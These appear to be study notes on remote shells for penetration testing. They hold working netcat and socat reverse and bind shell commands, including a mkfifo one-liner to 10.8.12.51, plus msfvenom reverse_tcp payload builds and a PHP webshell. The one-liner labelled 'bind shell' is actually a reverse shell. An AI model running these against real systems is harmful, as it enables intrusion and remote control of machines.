## Types of Shell
### [Reverse Shell]
The listener is on the attacker machine and the target is forced to execute code thats connect to the attacker.
![[ReverseShell.png]]

### [Bind Shell]
The listener is on the target machine and code is executed to start the listener attached to a shell.


![[BindShell.png]]

## Tools 
- [Netcat]
	- Swiss army tool
	- Most basic one
	- If port < 1024 sudo required
	- Functioning :
```bash
# Start netcat in reverse shell
	 > nc -lvnp <port-number> 
 	 > nc <ip-address> <port-number>
 	 
# Netcat Stabilisation
	# Technique 1 (note that python might be replaced by python2 or python3)
 	 > python -c 'import pty;pty.spawn("/bin/bash")'
 	 > export TERM=xterm
 	 > CTRL+Z
 	 > stty raw -echo; fg
 	 
	# Technique 2 - rlwrap
 	 > rlwrap nc -lvnp <port>
 	 > stty raw -echo; fg
 	 
 	 
	# Technique 3 - socat
 	 > sudo python3 -m http.server 80
 	 > wget <LOCAL-IP>/socat -O /tmp/socat
 	 > Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
 	 
# Shell resizing
	> stty rows <number>
	> stty cols <number>
	
# Other ways
*nc -e* is used to bind a process to a connection, if -e not permitted
> mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# bind shell
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.12.51 1234 >/tmp/f
```
	 
- [Socat]
	- More advanced than Netcan and works in a basis of connection 2 endpoints together
	- Can run in encrypted mode
	- Functionning : 
```bash
# Reverse shell mode
	> socat TCP-L:<port> -
	> socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
	> socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
# Bind shell mode
	> socat TCP-L:<PORT> EXEC:"bash -li"
	> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
# Connection normal and encrypted 
	> socat TCP:<TARGET-IP>:<TARGET-PORT> -
	> socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
# Encrypted mode
	# Reverse shell
		> openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt	
 	    > cat shell.key shell.crt > shell.pem
	    > socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
	# Bind shell
		> socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
		> socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
- [Metasploit -- multi/handler]
	- Tool for catching reverse shell
	- set payload
- [Msfvenom]
	- Standalone tool of the metasploit framework.
	- Mostly used in low level exploits.
	- 2 modes :
		- **Staged** :
			Payload in two parts, the first one sent to the server connect to the listener and the shell is loaded later. Prevent the detection of antiviruses.
		- **Stagedless**
			Shell is directly sent to the target.
	- Functionning :

```bash
<OS>/<arch>/<payload>
msfvenom --list payloads

# Standard 
> msfvenom -p <PAYLOAD> <OPTIONS>

# Windows x64 
> msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
> msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443_

```

- [Webshell]
	- php
```
<?php  
if(isset($_GET['cmd'])) {  
system($_GET['cmd']);  
}  
?>

```


[Stabilization]
```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```